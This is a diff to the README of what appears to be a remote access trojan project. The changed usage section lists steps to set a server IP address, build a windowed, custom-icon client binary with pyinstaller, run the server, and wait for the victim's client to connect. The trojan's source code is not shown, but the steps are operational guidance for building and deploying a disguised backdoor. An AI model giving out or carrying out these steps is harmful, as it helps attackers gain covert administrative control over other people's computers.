@@ -28,19 +28,22 @@ Created a remote access trojan that will establish administrative control over a
 4. pyinstaller
 
 # Usage
-1. Set ip_address. The ip_address is taken from the server's network
 
-2. Use pyinstaller to build the client binary
+1.Install requirements.txt
+
+2. Set ip_address. The ip_address is taken from the server's network
+
+3. Use pyinstaller to build the client binary
 ```
 python pyinstaller.py --onefile --windowed --icon=icon.ico client.pyw
 ```
 
-3. Run the server
+4. Run the server
 ```
 python server.py
 ```
 
-4. Wait for the client to connect
+5. Wait for the client to connect
 
 # ToDo
 
